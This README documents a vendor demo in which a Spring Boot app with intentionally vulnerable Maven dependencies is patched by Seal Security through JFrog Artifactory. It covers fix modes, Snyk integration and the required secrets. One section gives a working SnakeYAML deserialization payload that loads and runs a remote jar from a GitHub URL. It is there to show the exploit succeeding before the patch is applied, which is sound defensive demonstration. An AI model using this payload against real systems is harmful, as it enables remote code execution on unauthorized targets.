# Seal Security + JFrog Artifactory — Maven Demo

A Spring Boot application with intentionally vulnerable Maven dependencies, demonstrating how **Seal Security** remediates open-source vulnerabilities when all artifact traffic is routed through **JFrog Artifactory** as a proxy.

## Vulnerabilities

| Package | Version | CVE | Severity |
|---|---|---|---|
| snakeyaml | 1.33 | CVE-2022-1471 (RCE) | Critical |
| jackson-databind | 2.13.1 | CVE-2022-42003 | Critical |
| log4j-core | 2.14.1 | CVE-2021-44228 (Log4Shell) | Critical |
| commons-text | 1.9 | CVE-2022-42889 (Text4Shell) | Critical |
| spring-core | 5.3.26 | CVE-2022-22965 (Spring4Shell) | Critical |

> **New to Seal?** See [HOW-IT-WORKS.md](HOW-IT-WORKS.md) for a full explanation of fix modes, JFrog integration, and Snyk integration.

## How JFrog Integration Works

Instead of the Seal CLI fetching patched packages directly from `maven.sealsecurity.io`, all artifact traffic is routed **through JFrog Artifactory**. This supports environments where CI runners can only reach JFrog and have no direct internet access.

```
CI Runner → JFrog Artifactory (seal-mvn remote repo) → maven.sealsecurity.io
```

**JFrog is configured with two Seal remote repositories:**

| Repo Key | Type | Proxies |
|---|---|---|
| `seal-cli` | Generic | `https://cli.sealsecurity.io/authenticated/jfrog` |
| `seal-mvn` | Maven | `https://maven.sealsecurity.io` |

The workflow writes a `~/.m2/settings.xml` at runtime that points Maven at the `seal-mvn` JFrog remote repo. The Seal CLI is told to route through JFrog via `SEAL_JFROG_ENABLED=1`.

After a successful run, you can verify in JFrog Artifactory that sealed package versions (e.g. `snakeyaml-1.33+sp1.jar`) appear cached in the `seal-mvn` repository — proving the traffic flowed through JFrog.

## Fix Modes

The **Seal Security + JFrog Remediation** workflow accepts a `fix_mode` input with three options:

### `remote` (default)
The Seal CLI queries the **Seal platform** for sealing rules approved in the Seal UI (`app.sealsecurity.io/protection/rules`). This is the recommended production mode — security teams control which fixes are approved centrally.

```
Seal CLI → Seal Platform (checks rules) → applies approved fixes → downloads sealed packages via JFrog
```

**Requires:** A sealing rule configured in the Seal UI (e.g. "seal all packages, safest version").

### `local`
The Seal CLI reads `.seal-actions.yml` from the repository root. This file is committed to the repo and defines exactly which version overrides to apply — no Seal platform communication needed at fix time.

```
Seal CLI → reads .seal-actions.yml → applies committed overrides → downloads sealed packages via JFrog
```

**Requires:** `.seal-actions.yml` present in the repo (this repo includes one). Useful for air-gapped environments or when you want overrides version-controlled alongside the code.

**`.seal-actions.yml` in this repo:**
```yaml
overrides:
  org.yaml:snakeyaml:
    "1.33":
      use: 1.33+sp1
  com.fasterxml.jackson.core:jackson-databind:
    "2.13.1":
      use: 2.13.1+sp1
  org.apache.commons:commons-text:
    "1.9":
      use: 1.9+sp1
  # ... and more
```

### `all`
The Seal CLI applies every sealed version available for vulnerable dependencies, regardless of platform rules or local config. Useful for broad scanning and demos.

```
Seal CLI → fetches all available sealed versions → downloads via JFrog
```

## Snyk Integration

After Seal applies fixes, the CLI automatically calls the **Snyk API** to mark remediated CVEs as resolved in the Snyk dashboard — no webhook setup required. Vulnerabilities patched by Seal are marked as "not vulnerable" with a comment: *"vulnerability patched by seal-security"*.

## Workflows

### `Build and Run (Unpatched)`
Runs the application with original vulnerable dependencies. Use this first to demonstrate the exploit succeeding.

- **Exploit payload** (paste into the name field):
  ```
  !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["https://raw.githubusercontent.com/seal-sec-demo-2/yaml-payload/main/yaml-payload.jar"]]]]
  ```

### `Seal Security + JFrog Remediation`
Runs Seal to fix vulnerabilities via JFrog, then starts the patched application. The same exploit payload will be blocked.

**Recommended demo sequence:**
1. Run **Build and Run (Unpatched)** → exploit succeeds
2. Run **Seal Security + JFrog Remediation** with `fix_mode: remote` → exploit blocked
3. Check JFrog Artifactory → sealed packages appear in `seal-mvn` repo
4. Check Snyk dashboard → CVEs marked as resolved

## Required GitHub Secrets

| Secret | Description |
|---|---|
| `SEAL_TOKEN` | Seal Security artifact server token |
| `JFROG_TOKEN` | JFrog reference token (User scope, never expires) |
| `JFROG_HOST` | JFrog hostname (e.g. `mycompany.jfrog.io`) |
| `JFROG_USER` | JFrog username |
| `SNYK_TOKEN` | Snyk API token |
| `SNYK_ORG_ID` | Snyk organization ID |
| `SNYK_PROJECT_ID` | Snyk project ID for this repo |
| `NGROK_TOKEN` | ngrok authtoken |

**Repository variable** (not a secret — needs to be visible in logs):

| Variable | Description |
|---|---|
| `NGROK_URL` | Reserved ngrok domain for the live demo (e.g. `my-domain.ngrok.dev`) |
